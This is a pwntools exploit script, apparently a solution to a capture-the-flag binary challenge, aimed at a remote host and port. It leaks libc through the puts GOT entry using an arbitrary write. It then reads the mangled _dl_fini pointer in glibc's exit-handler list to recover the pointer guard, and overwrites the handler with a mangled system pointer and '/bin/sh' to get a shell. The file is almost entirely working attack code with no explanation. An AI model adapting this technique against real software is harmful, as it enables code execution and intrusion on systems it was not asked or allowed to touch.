from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.46.232.251", 5000)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401463
b *0x401514
b *0x40139c
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def decrypt(encrypted_dl_fini, dl_fini):
    return ror(encrypted_dl_fini, 0x11, 64) ^ dl_fini

io = start()

book = 0
bookaddr = 0x404030

def write(where, what):
    sla(">", "1")
    sla("Where do you want to edit:", str(where))
    sa("What do you want to edit:", what)

def changebookname(name):
    global book, bookaddr
    write(bookaddr - book, p64(name) + p64(0x10000))
    book = name

def printname():
    sla(">", "2")
    ru("Here is your book: ")

sl(b'-1')
# sl(b'40')
changebookname(elf.got['puts'])
printname()
libc.address = uu64(6) - libc.sym['puts']
ic(hex(libc.address))


changebookname(libc.sym['initial'] + 0x18)
printname()
encrypted_dl_fini = uu64(8)
dl_fini = libc.address + 0x219380
if args.REMOTE:
    dl_fini += 0x2000

enc = decrypt(encrypted_dl_fini, dl_fini)

payload = p64(encrypt(libc.sym['system'], enc))
payload += p64(next(libc.search(b"/bin/sh\x00")))

write(0, payload)

io.interactive()
